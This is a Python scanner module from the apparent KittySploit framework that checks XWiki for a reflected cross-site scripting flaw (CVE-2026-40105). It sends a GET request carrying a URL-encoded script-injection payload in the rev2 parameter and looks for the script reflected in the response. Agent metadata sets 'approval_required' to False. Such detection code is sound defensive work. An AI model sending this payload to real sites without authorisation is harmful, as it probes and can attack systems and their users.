#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki is vulnerable to reflected Cross-Site Scripting (XSS) via the `viewer=changes` endpoint."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki - Cross-Site Scripting Detection',
        'description': 'XWiki is vulnerable to reflected Cross-Site Scripting (XSS) via the `viewer=changes` endpoint. The `rev2` parameter is not properly sanitised before being rendered in the response, allowing an attacker to inject arbitrary JavaScript. Affects XWiki versions prior to the patched release.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'xwiki', 'xss'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-w4fj-87j5-f25c',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-40105',
            'https://jira.xwiki.org/browse/XWIKI-22481',
        ],
        'cve': 'CVE-2026-40105',
    }

    def run(self):
        r = self.http_request(method="GET", path='/bin/view/Sandbox/?viewer=changes&rev1=9.1&rev2=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F17.6.0q1che%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Evfu80q44msz&form_token=test&language=en', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', '<h1>Changes for page', 'From version',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="XWiki - Cross-Site Scripting detected",
                path='/bin/view/Sandbox/?viewer=changes&rev1=9.1&rev2=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F17.6.0q1che%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Evfu80q44msz&form_token=test&language=en',
            )
            return True
        return False

